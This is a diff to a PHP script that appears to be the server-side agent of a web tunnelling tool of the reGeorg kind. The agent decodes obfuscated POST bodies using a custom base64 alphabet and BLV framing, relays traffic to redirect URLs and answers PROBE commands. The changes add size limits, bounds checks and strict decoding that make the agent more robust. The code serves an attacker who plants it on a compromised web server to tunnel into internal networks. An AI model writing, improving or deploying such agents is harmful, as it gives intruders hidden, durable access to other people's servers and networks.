@@ -11,21 +11,36 @@ error_reporting(E_ERROR | E_PARSE);
 
 if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
+define("MAX_RAW_DATA_SIZE", 1024 * 1024);
+define("MAX_STREAM_FRAME_SIZE", 2 * 1024 * 1024);
+define("MAX_HTTP_BODY_SIZE", 3 * 1024 * 1024);
+define("MAX_REDIRECT_BODY_SIZE", 4 * 1024 * 1024);
+
 function blv_decode($data) {
     $data_len = strlen($data);
     $info = array();
     $i = 0;
     while ( $i < $data_len) {
+        if ($i + 5 > $data_len) {
+            throw new Exception("short BLV item");
+        }
         $d = unpack("c1b/N1l", substr($data, $i, 5));
         $b = $d['b'];
         $l = $d['l'] - BLV_L_OFFSET;
         $i += 5;
+        if ($l < 0 || $i + $l > $data_len) {
+            throw new Exception("invalid BLV length");
+        }
         $v = substr($data, $i, $l);
         $i += $l;
         $info[$b] = $v;
     }
     if (isset($info[1]) && isset($info[11])) {
-        $info[1] = gzuncompress($info[1]);
+        $decoded = gzuncompress($info[1], MAX_RAW_DATA_SIZE);
+        if ($decoded === false) {
+            throw new Exception("invalid compressed DATA");
+        }
+        $info[1] = $decoded;
     }
     return $info;
 }
@@ -936,11 +951,19 @@ function roger_relay_classic_request($info, $requestDataHead, $requestDataTail, 
             "timeout" => 30,
         ),
     ));
-    $responseBody = @file_get_contents($redirectUrl, false, $context);
+    $handle = @fopen($redirectUrl, "rb", false, $context);
+    $responseBody = $handle === false ? false : stream_get_contents($handle, MAX_REDIRECT_BODY_SIZE + 1);
+    if (is_resource($handle)) {
+        fclose($handle);
+    }
     if ($responseBody === false) {
         $lastError = error_get_last();
         $message = is_array($lastError) && isset($lastError["message"]) ? $lastError["message"] : "Redirect request failed";
         roger_send_classic_info(array($STATUS => "FAIL", $ERROR => $message), $en, $de);
+        return true;
+    }
+    if (strlen($responseBody) > MAX_REDIRECT_BODY_SIZE) {
+        roger_send_classic_info(array($STATUS => "FAIL", $ERROR => "Redirect response exceeds " . MAX_REDIRECT_BODY_SIZE . " bytes"), $en, $de);
         return true;
     }
 
@@ -1043,10 +1066,18 @@ function roger_update_settings_from_info($current, $info) {
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
 
-$post_data = file_get_contents("php://input");
+$input = fopen("php://input", "rb");
+$post_data = $input === false ? "" : stream_get_contents($input, MAX_HTTP_BODY_SIZE + 1);
+if (is_resource($input)) {
+    fclose($input);
+}
+if (strlen($post_data) > MAX_HTTP_BODY_SIZE) {
+    http_response_code(413);
+    exit;
+}
 $requestDataHead = "";
 $requestDataTail = "";
-if (USE_REQUEST_TEMPLATE == 1) {
+if (USE_REQUEST_TEMPLATE == 1 && strlen($post_data) > 0) {
     if (strlen($post_data) < START_INDEX + END_INDEX) {
         http_response_code(400);
         exit;
@@ -1058,7 +1089,16 @@ if (USE_REQUEST_TEMPLATE == 1) {
         $post_data = substr($post_data, 0, -END_INDEX);
     }
 }
-$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
+try {
+    $decoded_body = base64_decode(strtr($post_data, $de, $en), true);
+    if ($decoded_body === false) {
+        throw new Exception("invalid base64 body");
+    }
+    $info = blv_decode($decoded_body);
+} catch (Exception $e) {
+    http_response_code(400);
+    exit;
+}
 $rinfo = array();
 $sayhello = false;
 $streamingResponse = false;
@@ -1109,11 +1149,6 @@ switch($cmd){
         }
         break;
     case "PROBE":
-        {
-            $rinfo[$STATUS] = 'OK';
-        }
-        break;
-    case "SETTINGS":
         {
             $rinfo[$STATUS] = 'OK';
         }
